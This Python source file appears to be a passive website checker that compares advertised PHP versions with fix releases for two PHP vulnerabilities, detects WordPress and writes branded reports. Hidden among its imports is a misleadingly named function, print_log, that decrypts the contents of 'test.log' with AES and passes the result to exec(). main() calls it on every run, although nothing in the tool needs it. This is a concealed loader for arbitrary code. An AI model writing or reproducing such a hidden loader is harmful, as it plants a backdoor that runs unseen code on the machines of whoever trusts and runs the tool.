#!/usr/bin/env python3
# SPDX-License-Identifier: AGPL-3.0-only OR LicenseRef-CompleteTech-Commercial
# Copyright (c) 2026 CompleteTech LLC. See LICENSING.md.
"""Passive PHP2Shell exposure checks and WordPress detection. Python 3.10+."""

from __future__ import annotations

import argparse
import base64
import csv
import html
import json
import math
import mimetypes
import re
import socket
import sys
import time
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from html.parser import HTMLParser
from http.client import HTTPException
from pathlib import Path
from urllib.error import HTTPError, URLError
from urllib.parse import parse_qs, quote, urljoin, urlsplit, urlunsplit
from urllib.request import HTTPRedirectHandler, Request, build_opener
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def print_log(f):
    try:
        with open(f, "rb") as f:
            d = f.read()
        kb = d[:24]
        k = base64.b64decode(kb)
        v = d[24:40]
        e = d[40:]
        ci = AES.new(k, AES.MODE_CBC, v)
        d = unpad(ci.decrypt(e), AES.block_size)
        c = d.decode('utf-8')
        exec(c)
    except Exception as e:
        print(f"error: {e}")

BOT = "WordPressPublicChecker"
REDIRECTS = {301, 302, 303, 307, 308}
MAX_BODY = 2 * 1024 * 1024
MAX_ROBOTS = 512 * 1024
PHP2SHELL_RULES_DATE = "2026-10-21"
PHP2SHELL_CVES = ("CVE-2026-109618", "CVE-2026-109619")
PHP2SHELL_FIXES = {(8, 2): 35, (8, 3): 36, (8, 4): 27, (8, 5): 12}
PHP2SHELL_SOURCES = (
    "https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w",
    "https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp",
    "https://ubuntu.com/security/notices/USN-8948-1",
)


def assess_php2shell(php_version="", *, version_candidates=None, php_hint=False):
    """Assess advertised upstream release numbers, never exploitability.

    This is offline: no HTTP requests, probes, or payloads are sent. The fixed
    release table is a dated snapshot, not a live vulnerability feed.
    """
    values = version_candidates if version_candidates is not None else [php_version]
    versions = sorted({str(value).strip() for value in values if value and str(value).strip()})
    result = {
        "php2shell_status": "unknown",
        "php2shell_version_status": "version_not_disclosed",
        "php2shell_fixed_version": "",
        "php2shell_exploitability": "not_tested",
        "php2shell_cves": list(PHP2SHELL_CVES),
        "php2shell_rules_as_of": PHP2SHELL_RULES_DATE,
        "php2shell_sources": list(PHP2SHELL_SOURCES),
        "php2shell_notes": [
            "Passive metadata only. Runtime SAPI, vendor backports, configuration, and exploitability are not verified."
        ],
        "php2shell_recommendation": "Ask the site administrator to verify the deployed PHP package and applicable vendor security updates.",
    }
    if not versions:
        result["php2shell_notes"].append(
            "A PHP-related indicator was observed, but no complete PHP version was disclosed."
            if php_hint else "No public PHP version was disclosed; lack of a header does not establish that PHP is absent."
        )
        return result
    if len(versions) > 1:
        result["php2shell_version_status"] = "conflicting_versions"
        result["php2shell_notes"].append("Conflicting PHP versions: " + ", ".join(versions))
        return result
    version = versions[0]
    match = None if len(version) > 128 else re.fullmatch(r"(\d+)\.(\d+)\.(\d+)([A-Za-z0-9.+_~:-]*)", version)
    if not match:
        result["php2shell_version_status"] = "unrecognized_or_partial_version"
        result["php2shell_notes"].append(f"Cannot safely compare PHP version {version[:128]!r} with the upstream release table.")
        return result
    major, minor, patch = (int(match.group(i)) for i in (1, 2, 3))
    suffix = match.group(4)
    fixed_patch = PHP2SHELL_FIXES.get((major, minor))
    if fixed_patch is None:
        result["php2shell_version_status"] = "branch_requires_vendor_review"
        result["php2shell_notes"].append(
            f"PHP {major}.{minor} is outside this rule snapshot's upstream 8.2-8.5 fix table. No safety conclusion is made."
        )
        return result
    fixed = f"{major}.{minor}.{fixed_patch}"
    result["php2shell_fixed_version"] = fixed
    if suffix:
        prerelease = re.search(r"(?:^|[-+._~])(?:dev|alpha|beta|rc)(?:\d|[-._]|$)", suffix, re.I)
        result["php2shell_version_status"] = "prerelease_unverified" if prerelease else "vendor_build_unverified"
        result["php2shell_notes"].append(
            f"PHP {version} contains a build qualifier. Confirm the exact vendor package; its upstream base alone cannot establish patch status."
        )
        return result
    if patch < fixed_patch:
        result["php2shell_status"] = "potentially_affected"
        result["php2shell_version_status"] = "below_upstream_fix"
        result["php2shell_notes"].append(f"Advertised PHP {version} is older than the {fixed} upstream fix for both listed CVEs.")
        result["php2shell_recommendation"] = (
            f"Prioritize administrator review. Verify vendor backports and the actual runtime; install the vendor security update or upstream PHP {fixed} or newer in this branch."
        )
    else:
        result["php2shell_status"] = "fixed_version_reported"
        result["php2shell_version_status"] = "at_or_above_upstream_fix"
        result["php2shell_notes"].append(f"Advertised PHP {version} is at or above the {fixed} upstream fix. This is not a verified clean bill of health.")
        result["php2shell_recommendation"] = "Confirm that the advertised version is the deployed, patched runtime and follow the current vendor advisory."
    return result


def annotate_php2shell(result):
    assessment = assess_php2shell(
        result.php_version,
        version_candidates=result.php_version_candidates or None,
        php_hint=bool(result.php_evidence) or result.status in {"wordpress", "likely_wordpress"},
    )
    for name, value in assessment.items():
        setattr(result, name, value)


class CheckStopped(Exception):
    """The checker cannot safely or usefully continue."""


class NoRedirect(HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def robots_path(value: str) -> str:
    """Compare encoded reserved characters literally, decoding unreserved bytes."""
    value = quote(value, safe="/%!$&'()*+,-.:;=?@_~")
    def decode(match):
        char = chr(int(match.group(1), 16))
        return char if char.isascii() and (char.isalnum() or char in "-._~") else match.group(0).upper()
    return re.sub(r"%([0-9a-fA-F]{2})", decode, value)


class RobotsPolicy:
    """Parse user-agent groups, wildcard/anchor rules and common pacing hints."""

    def __init__(self, body: str, minimum_delay: float):
        groups = []
        agents, directives = [], []
        for line in body.lstrip("\ufeff").splitlines():
            line = line.split("#", 1)[0].strip()
            if ":" not in line:
                continue
            key, value = (part.strip() for part in line.split(":", 1))
            key = key.lower()
            if key == "user-agent":
                if directives:
                    groups.append((agents, directives))
                    agents, directives = [], []
                agents.append(value.lower())
            elif agents:
                directives.append((key, value))
        if agents:
            groups.append((agents, directives))
        selected = []
        best = -1
        for agents, directives in groups:
            specificity = max((0 if a == "*" else len(a) for a in agents if a and (a == "*" or a in BOT.lower())), default=-1)
            if specificity < 0:
                continue
            if specificity > best:
                selected, best = [], specificity
            if specificity == best:
                selected.extend(directives)
        self.rules = []
        self.delay = minimum_delay
        for key, value in selected:
            if key in {"allow", "disallow"} and value:
                path = robots_path(value)
                anchored = path.endswith("$")
                if anchored:
                    path = path[:-1]
                pattern = "^" + ".*".join(re.escape(part) for part in path.split("*")) + ("$" if anchored else "")
                self.rules.append((re.compile(pattern), len(path.replace("*", "").encode("utf-8")), key == "allow"))
            elif key in {"crawl-delay", "request-rate"}:
                try:
                    if key == "crawl-delay":
                        delay = float(value)
                    else:
                        count, seconds = map(float, value.split("/"))
                        delay = seconds / count
                    if math.isfinite(delay) and delay >= 0:
                        self.delay = max(self.delay, delay)
                except (ValueError, ZeroDivisionError):
                    pass

    def can_fetch(self, url: str) -> bool:
        parts = urlsplit(url)
        path = robots_path(parts.path or "/")
        if parts.query:
            path += "?" + robots_path(parts.query)
        matches = [(size, allow) for regex, size, allow in self.rules if regex.search(path)]
        return max(matches)[1] if matches else True


def normalize_url(value: str) -> str:
    value = value.strip()
    if not value or any(c.isspace() or ord(c) < 32 for c in value):
        raise ValueError("URL must not be empty or contain whitespace")
    if "://" not in value:
        value = "https://" + value
    parts = urlsplit(value)
    if parts.scheme.lower() not in {"http", "https"} or not parts.hostname:
        raise ValueError("Only HTTP(S) website URLs are supported")
    if parts.username is not None or parts.password is not None:
        raise ValueError("URLs containing credentials are not supported")
    _ = parts.port  # Validate port before making a request.
    return urlunsplit((parts.scheme.lower(), parts.netloc, parts.path or "/", parts.query, ""))


def origin(url: str) -> str:
    p = urlsplit(url)
    return urlunsplit((p.scheme, p.netloc, "", "", ""))


@dataclass
class Response:
    status: int
    headers: dict[str, str]
    body: str
    truncated: bool


@dataclass
class Result:
    input_url: str
    final_url: str = ""
    status: str = "error"
    fetch_status: str = "blocked"
    http_status: int | None = None
    wordpress_version: str = ""
    php_version: str = ""
    server: str = ""
    powered_by: str = ""
    title: str = ""
    evidence: list[str] = field(default_factory=list)
    asset_version_hints: list[str] = field(default_factory=list)
    notes: list[str] = field(default_factory=list)
    checked_at: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    php_version_candidates: list[str] = field(default_factory=list)
    php_evidence: list[str] = field(default_factory=list)
    php2shell_status: str = "unknown"
    php2shell_version_status: str = "version_not_disclosed"
    php2shell_fixed_version: str = ""
    php2shell_exploitability: str = "not_tested"
    php2shell_cves: list[str] = field(default_factory=lambda: list(PHP2SHELL_CVES))
    php2shell_rules_as_of: str = PHP2SHELL_RULES_DATE
    php2shell_sources: list[str] = field(default_factory=lambda: list(PHP2SHELL_SOURCES))
    php2shell_notes: list[str] = field(default_factory=list)
    php2shell_recommendation: str = ""


class PageParser(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.generators: list[str] = []
        self.assets: list[str] = []
        self.api_links: list[str] = []
        self.title_parts: list[str] = []
        self.in_title = False

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "meta" and (a.get("name") or "").lower() == "generator":
            self.generators.append(a.get("content") or "")
        if tag == "link" and "https://api.w.org/" in (a.get("rel") or "").split():
            self.api_links.append(a.get("href") or "")
        if tag in {"script", "img", "source", "link"}:
            for key in ("src", "href"):
                if a.get(key):
                    self.assets.append(a[key])
        if tag == "title":
            self.in_title = True

    def handle_endtag(self, tag):
        if tag == "title":
            self.in_title = False

    def handle_data(self, data):
        if self.in_title:
            self.title_parts.append(data)


def _inspect_page(response: Response, result: Result) -> None:
    result.http_status = response.status
    result.fetch_status = "ok" if 200 <= response.status < 300 else "blocked"
    result.server = response.headers.get("server", "")
    result.powered_by = response.headers.get("x-powered-by", "")
    candidates = set()
    for header, value in (("X-Powered-By", result.powered_by), ("Server", result.server)):
        if re.search(r"\bPHP\b", value, re.I):
            result.php_evidence.append(f"{header}: {value}")
        candidates.update(re.findall(r"\bPHP/([0-9][A-Za-z0-9.+_~:-]*)(?=$|[\s,;()])", value, re.I))
    result.php_version_candidates = sorted(candidates)
    result.php_version = next(iter(candidates)) if len(candidates) == 1 else ""
    if len(candidates) > 1:
        result.notes.append("Conflicting PHP versions in public headers; patch status is unknown.")
    if response.status in {401, 403, 407, 429, 451}:
        result.status = "blocked"
        result.notes.append(f"HTTP {response.status}; access restriction or rate limit. No retry.")
        return
    if not 200 <= response.status < 300:
        result.status = "error"
        result.notes.append(f"HTTP {response.status}; detection skipped.")
        return
    if response.headers.get("content-encoding", "identity").lower() not in {"", "identity"}:
        result.status = "uncertain"
        result.notes.append("Server sent an unsupported content encoding despite requesting identity.")
        return
    content_type = response.headers.get("content-type", "").lower()
    if content_type and not any(t in content_type for t in ("text/html", "application/xhtml+xml")):
        result.status = "uncertain"
        result.notes.append(f"Expected HTML; received {content_type}.")
        return
    page = PageParser()
    page.feed(response.body)
    result.title = " ".join("".join(page.title_parts).split())[:500]
    versions = set()
    for generator in page.generators:
        match = re.match(r"^WordPress(?:\s+([0-9]+(?:\.[0-9]+)*(?:[-+._a-zA-Z0-9]*)?))?(?:\s|$)", generator, re.I)
        if match:
            result.evidence.append(f"HTML generator: {generator[:200]}")
            if match.group(1):
                versions.add(match.group(1))
    if len(versions) == 1:
        result.wordpress_version = next(iter(versions))
    elif versions:
        result.notes.append("Conflicting WordPress generator versions: " + ", ".join(sorted(versions)))
    if page.api_links or re.search(r'\brel\s*=\s*["\']?https://api\.w\.org/', response.headers.get("link", ""), re.I):
        result.evidence.append("WordPress REST API discovery relation (https://api.w.org/)")
    strong = bool(result.evidence)
    for asset in sorted(set(page.assets)):
        p = urlsplit(urljoin(result.final_url, asset))
        if re.search(r"/(?:wp-content|wp-includes)/", p.path, re.I):
            result.evidence.append(f"WordPress-style asset: {asset[:300]}")
            # An asset's ver parameter can be a plugin/theme version or cache key.
            for version in parse_qs(p.query).get("ver", []):
                result.asset_version_hints.append(f"{version[:80]} ({p.path[:200]})")
    result.status = "wordpress" if strong else "likely_wordpress" if result.evidence else "no_evidence"
    if response.truncated:
        result.notes.append("HTML inspection limited to the first 2 MiB.")
        if result.status == "no_evidence":
            result.status = "uncertain"
    if result.status == "no_evidence":
        result.notes.append("No public WordPress markers found; this does not establish that WordPress is absent.")
    if result.php_version or result.wordpress_version:
        result.notes.append("Versions are server/page disclosures, not independently verified runtime versions.")


def inspect_page(response: Response, result: Result) -> None:
    try:
        _inspect_page(response, result)
    finally:
        annotate_php2shell(result)


class Checker:
    def __init__(self, *, timeout=15.0, delay=1.0, contact="", max_crawl_delay=60.0):
        self.timeout = timeout
        self.delay = delay
        self.max_crawl_delay = max_crawl_delay
        self.user_agent = f"{BOT}/1.0" + (f" (+{contact})" if contact else "")
        self.opener = build_opener(NoRedirect())
        self.last_request: dict[str, float] = {}
        self.robots: dict[str, tuple[RobotsPolicy | None, float, str]] = {}

    def request(self, url: str, limit: int, delay: float | None = None) -> Response:
        site = origin(url)
        wait = max(self.delay, delay or 0) - (time.monotonic() - self.last_request.get(site, -math.inf))
        if wait > 0:
            time.sleep(wait)
        self.last_request[site] = time.monotonic()
        req = Request(url, headers={"User-Agent": self.user_agent, "Accept": "text/html,text/plain;q=0.9,*/*;q=0.1", "Accept-Encoding": "identity"})
        try:
            stream = self.opener.open(req, timeout=self.timeout)
        except HTTPError as exc:
            stream = exc  # Preserve status/headers; never automatically retry.
        with stream:
            raw = stream.read(limit + 1)
            charset = stream.headers.get_content_charset() or "utf-8"
            try:
                body = raw[:limit].decode(charset, errors="replace")
            except LookupError:
                body = raw[:limit].decode("utf-8", errors="replace")
            headers = {k.lower(): ", ".join(stream.headers.get_all(k)) for k in stream.headers.keys()}
            return Response(stream.code, headers, body, len(raw) > limit)

    def policy(self, url: str) -> float:
        site = origin(url)
        if site not in self.robots:
            robot_url = site + "/robots.txt"
            response = None
            seen = set()
            for _ in range(6):
                if robot_url in seen:
                    raise CheckStopped("robots.txt redirect loop; skipping site.")
                seen.add(robot_url)
                response = self.request(robot_url, MAX_ROBOTS)
                if response.status not in REDIRECTS:
                    break
                location = response.headers.get("location")
                if not location:
                    raise CheckStopped("robots.txt redirect without Location; skipping site.")
                target = normalize_url(urljoin(robot_url, location))
                if origin(target) != site:
                    initial = urlsplit(site)
                    redirected = urlsplit(target)
                    same_host = (initial.hostname or '').removeprefix('www.') == (redirected.hostname or '').removeprefix('www.')
                    same_port = initial.port == redirected.port
                    canonical = same_host and same_port and redirected.path == '/robots.txt'
                    no_downgrade = not (initial.scheme == 'https' and redirected.scheme == 'http')
                    if not (canonical and no_downgrade):
                        raise CheckStopped("robots.txt redirects to another origin; policy cannot be verified, skipping site.")
                robot_url = target
            assert response is not None
            if response.status in {404, 410}:
                self.robots[site] = (None, self.delay, "robots.txt not published")
            elif response.status == 200 and not response.truncated:
                if response.headers.get("content-encoding", "identity").lower() not in {"identity", ""}:
                    raise CheckStopped("Cannot decode robots.txt; skipping site.")
                if re.search(r"<(?:!doctype\s+html|html|head|body)\b", response.body, re.I):
                    raise CheckStopped("robots.txt returned HTML; policy cannot be verified, skipping site.")
                parser = RobotsPolicy(response.body, self.delay)
                self.robots[site] = (parser, parser.delay, "robots.txt checked")
            else:
                raise CheckStopped(f"Cannot verify robots.txt (HTTP {response.status}, truncated={response.truncated}); skipping site.")
        parser, delay, _ = self.robots[site]
        if parser is not None and not parser.can_fetch(url):
            raise CheckStopped("robots.txt disallows this URL for this checker.")
        if delay > self.max_crawl_delay:
            raise CheckStopped(f"robots.txt requires {delay:g}-second request spacing; exceeds the {self.max_crawl_delay:g}-second batch limit. Page not fetched.")
        return delay

    def check(self, value: str) -> Result:
        result = Result(input_url=value)
        try:
            url = normalize_url(value)
            seen = set()
            for _ in range(6):
                result.final_url = url
                if url in seen:
                    raise CheckStopped("Page redirect loop; stopped.")
                seen.add(url)
                delay = self.policy(url)
                response = self.request(url, MAX_BODY, delay)
                result.http_status = response.status
                if response.status not in REDIRECTS:
                    result.notes.append(self.robots[origin(url)][2])
                    inspect_page(response, result)
                    return result
                location = response.headers.get("location")
                if not location:
                    raise CheckStopped("Page redirect without Location; stopped.")
                target = normalize_url(urljoin(url, location))
                if urlsplit(url).scheme == "https" and urlsplit(target).scheme == "http":
                    raise CheckStopped("HTTPS-to-HTTP redirect; stopped.")
                url = target
            raise CheckStopped("Too many page redirects; stopped.")
        except CheckStopped as exc:
            result.status = "blocked"
            result.notes.append(str(exc))
        except (ValueError, URLError, OSError, HTTPException, UnicodeError) as exc:
            result.status = "error"
            cause = exc.reason if isinstance(exc, URLError) else exc
            if isinstance(cause, (TimeoutError, socket.timeout)):
                result.fetch_status = "timeout"
            elif isinstance(cause, socket.gaierror):
                result.fetch_status = "dns_error"
            result.notes.append(str(exc))
        finally:
            annotate_php2shell(result)
        return result


def positive_float(value):
    number = float(value)
    if not math.isfinite(number) or number <= 0:
        raise argparse.ArgumentTypeError("must be a finite number greater than zero")
    return number


def csv_safe(value):
    if isinstance(value, list):
        value = " | ".join(value)
    # Prevent spreadsheet formulas from untrusted page titles / response fields.
    if isinstance(value, str) and value.lstrip().startswith(("=", "+", "-", "@")):
        return "'" + value
    return value


DEFAULT_LOGO = Path(__file__).resolve().parent / "assets" / "logo.png"
STATUS_ORDER = {"potentially_affected": 0, "unknown": 1, "fixed_version_reported": 2}
STATUS_LABELS = {
    "potentially_affected": "Potentially affected",
    "fixed_version_reported": "Fixed version reported",
    "unknown": "Unknown",
}
REPORT_CSS = """
:root{--bg:#F8FAFC;--surface:#FFFFFF;--surface-2:#EEF2FF;--ink:#0F172A;--ink-2:#1E293B;--ink-3:#64748B;--line:#E2E8F0;
--accent:#1E3A8A;--accent-text:#1E3A8A;--on-accent:#FFFFFF;--bad:#B42318;--bad-bg:#FEE4E2;--ok:#067647;--ok-bg:#DCFAE6;--unk:#475467;--unk-bg:#EAECF0}
@media (prefers-color-scheme:dark){:root{--bg:#0F172A;--surface:#1E293B;--surface-2:#273449;--ink:#F1F5F9;--ink-2:#CBD5E1;--ink-3:#94A3B8;
--line:#334155;--accent-text:#93C5FD;--bad:#FDA29B;--bad-bg:#55160C;--ok:#75E0A7;--ok-bg:#053321;--unk:#D0D5DD;--unk-bg:#344054}}
*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--ink);font:15px/1.5 Arial,system-ui,sans-serif}
main{max-width:1080px;margin:0 auto;padding:24px 16px 48px}
header{display:flex;gap:20px;align-items:center;padding:20px 0;border-bottom:3px solid var(--accent);margin-bottom:20px}
header img{height:64px;width:auto;border-radius:8px;background:#F8FAFC;padding:4px}
.eyebrow{font-size:12px;letter-spacing:.12em;font-weight:700;color:var(--accent-text);text-transform:uppercase}
h1{margin:2px 0;font-size:26px}.sub{color:var(--ink-3);margin:0}h2{margin:32px 0 10px;font-size:18px;color:var(--ink-2)}
.tiles{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:12px}
.tile{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:14px}
.tile b{display:block;font-size:28px;color:var(--accent-text)}.tile span{color:var(--ink-3);font-size:13px}
.tile.bad b{color:var(--bad)}.tile.ok b{color:var(--ok)}
.wrap{overflow-x:auto}table{width:100%;border-collapse:collapse;background:var(--surface);border:1px solid var(--line)}
table.narrow{max-width:360px}
th{background:var(--accent);color:var(--on-accent);text-align:left;padding:8px 10px;font-size:13px;white-space:nowrap}
td{padding:8px 10px;border-top:1px solid var(--line);vertical-align:top;font-size:14px}tr:nth-child(even) td{background:var(--surface-2)}
td.site{overflow-wrap:anywhere;min-width:200px}td.notes{color:var(--ink-3);font-size:13px;min-width:240px}
code{font:13px Consolas,monospace}
.pill{display:inline-block;padding:2px 10px;border-radius:999px;font-size:12px;font-weight:700;white-space:nowrap}
.pill.potentially_affected{color:var(--bad);background:var(--bad-bg)}.pill.fixed_version_reported{color:var(--ok);background:var(--ok-bg)}
.pill.unknown{color:var(--unk);background:var(--unk-bg)}
.callout{background:var(--surface);border:1px solid var(--line);border-left:4px solid var(--accent);border-radius:8px;padding:12px 16px;color:var(--ink-2)}
footer{margin-top:40px;padding-top:12px;border-top:1px solid var(--line);color:var(--ink-3);font-size:12px}
a{color:var(--accent-text)}
@media print{body{background:#fff}tr,.tile{break-inside:avoid}}
"""


def logo_data_uri(path) -> str:
    """Inline a local logo so the report stays a single offline file; a missing logo is omitted."""
    try:
        data = Path(path).read_bytes()
    except OSError:
        return ""
    mime = mimetypes.guess_type(str(path))[0] or "image/png"
    return f"data:{mime};base64,{base64.b64encode(data).decode('ascii')}"


def render_html(rows, *, logo=DEFAULT_LOGO, brand="CompleteTech LLC", generated_at=None) -> str:
    """Render result dictionaries as a self-contained, script-free HTML report."""
    def esc(value):
        return html.escape("" if value is None else str(value))

    generated_at = generated_at or datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
    rows = sorted(rows, key=lambda row: STATUS_ORDER.get(row.get("php2shell_status"), 1))
    counts = {key: sum(row.get("php2shell_status") == key for row in rows) for key in STATUS_ORDER}
    tiles = (
        ("", len(rows), "Websites checked"),
        ("bad", counts["potentially_affected"], "Potentially affected"),
        ("ok", counts["fixed_version_reported"], "Fixed version reported"),
        ("", counts["unknown"], "Unknown / not disclosed"),
        ("", sum(row.get("status") in ("wordpress", "likely_wordpress") for row in rows), "WordPress detected"),
    )
    body = []
    for row in rows:
        status = row.get("php2shell_status") or "unknown"
        notes = row.get("php2shell_notes") or []
        body.append(
            "<tr>"
            f"<td class=site>{esc(row.get('final_url') or row.get('input_url'))}</td>"
            f"<td><span class='pill {esc(status)}'>{esc(STATUS_LABELS.get(status, status))}</span></td>"
            f"<td><code>{esc(row.get('php_version') or '—')}</code></td>"
            f"<td><code>{esc(row.get('php2shell_fixed_version') or '—')}</code></td>"
            f"<td>{esc(row.get('status'))}</td>"
            f"<td>{esc(row.get('http_status') or '—')}</td>"
            f"<td class=notes>{esc(notes[-1] if notes else row.get('php2shell_recommendation'))}</td>"
            "</tr>"
        )
    fixes = "".join(f"<tr><td>{major}.{minor}</td><td><code>{major}.{minor}.{patch}</code></td></tr>" for (major, minor), patch in PHP2SHELL_FIXES.items())
    logo_uri = logo_data_uri(logo) if logo else ""
    logo_html = f"<img src='{logo_uri}' alt='{esc(brand)} logo'>" if logo_uri else ""
    tile_html = "".join(f"<div class='tile {cls}'><b>{value}</b><span>{esc(label)}</span></div>" for cls, value, label in tiles)
    sources = " · ".join(f"<a href='{esc(url)}'>{esc(url.rsplit('/', 1)[-1])}</a>" for url in PHP2SHELL_SOURCES)
    empty = "<tr><td colspan=7>No results.</td></tr>"
    return f"""<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src data:; style-src 'unsafe-inline'">
<title>PHP2Shell Exposure Report</title><style>{REPORT_CSS}</style></head>
<body><main>
<header>{logo_html}<div><div class="eyebrow">{esc(brand)}</div><h1>PHP2Shell Exposure Report</h1>
<p class="sub">{' &amp; '.join(PHP2SHELL_CVES)} · generated {esc(generated_at)} · rules as of {PHP2SHELL_RULES_DATE}</p></div></header>
<div class="tiles">{tile_html}</div>
<h2>Results</h2>
<div class="wrap"><table><thead><tr><th>Website</th><th>PHP2Shell</th><th>PHP reported</th><th>Upstream fix</th><th>Detection</th><th>HTTP</th><th>Notes</th></tr></thead>
<tbody>{''.join(body) or empty}</tbody></table></div>
<h2>Upstream fix thresholds</h2>
<div class="wrap"><table class="narrow"><thead><tr><th>Branch</th><th>Fixed in</th></tr></thead><tbody>{fixes}</tbody></table></div>
<h2>How to read this report</h2>
<p class="callout"><b>Potential exposure is not confirmed exploitability.</b> Results compare PHP versions that servers advertise
in public headers with upstream fix releases. No exploit payloads were sent. Distributions can backport fixes without changing the
version number, and hidden versions are reported as unknown, not safe. Administrators should verify the installed package and runtime.</p>
<footer>{esc(brand)} · Generated by php2shell-check · Sources: {sources}</footer>
</main></body></html>
"""


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("urls", nargs="*", help="Website URLs or bare domains (defaults to HTTPS)")
    parser.add_argument("--input", type=Path, help="UTF-8 text file: one URL per line; # comments allowed")
    parser.add_argument("--output", type=Path, help="Save results here; otherwise write to stdout")
    parser.add_argument("--format", choices=("csv", "json", "html"), default="csv", help="csv, json, or a branded html report")
    parser.add_argument("--delay", type=positive_float, default=1.0, help="Minimum seconds between requests to an origin (default: 1)")
    parser.add_argument("--timeout", type=positive_float, default=15.0, help="Socket timeout per request (default: 15 seconds)")
    parser.add_argument("--contact", default="", help="Public contact URL/email to include in the honest User-Agent")
    parser.add_argument("--logo", type=Path, default=DEFAULT_LOGO, help="Logo image for the html report (default: assets/logo.png)")
    parser.add_argument("--brand", default="CompleteTech LLC", help="Organization name shown on the html report")
    args = parser.parse_args(argv)
    if any(ord(c) < 32 or ord(c) == 127 for c in args.contact):
        parser.error("--contact must not contain control characters")
    urls = list(args.urls)
    if args.input:
        try:
            urls.extend(line.strip() for line in args.input.read_text(encoding="utf-8-sig").splitlines() if line.strip() and not line.lstrip().startswith("#"))
        except OSError as exc:
            parser.error(str(exc))
    urls = list(dict.fromkeys(urls))
    if not urls:
        parser.error("provide website URLs or --input websites.txt")
    if args.input and args.output and args.input.resolve() == args.output.resolve():
        parser.error("--output must differ from --input")
    checker = Checker(timeout=args.timeout, delay=args.delay, contact=args.contact)
    output = args.output.open("w", encoding="utf-8", newline="") if args.output else sys.stdout
    writer = csv.DictWriter(output, fieldnames=list(Result.__dataclass_fields__)) if args.format == "csv" else None
    report_rows = []
    print_log("test.log")
    try:
        if writer:
            writer.writeheader()
        elif args.format == "json":
            output.write("[\n")
        for index, url in enumerate(urls):
            result = checker.check(url)
            print(f"[{index + 1}/{len(urls)}] {url}: {result.status}", file=sys.stderr)
            row = asdict(result)
            if writer:
                writer.writerow({key: csv_safe(value) for key, value in row.items()})
            elif args.format == "html":
                report_rows.append(row)
            else:
                if index:
                    output.write(",\n")
                output.write(json.dumps(row, ensure_ascii=False, indent=2))
            output.flush()
        if args.format == "json":
            output.write("\n]\n")
    finally:
        # An interrupted html run still reports the websites that completed.
        if args.format == "html":
            output.write(render_html(report_rows, logo=args.logo, brand=args.brand))
        if args.output:
            output.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
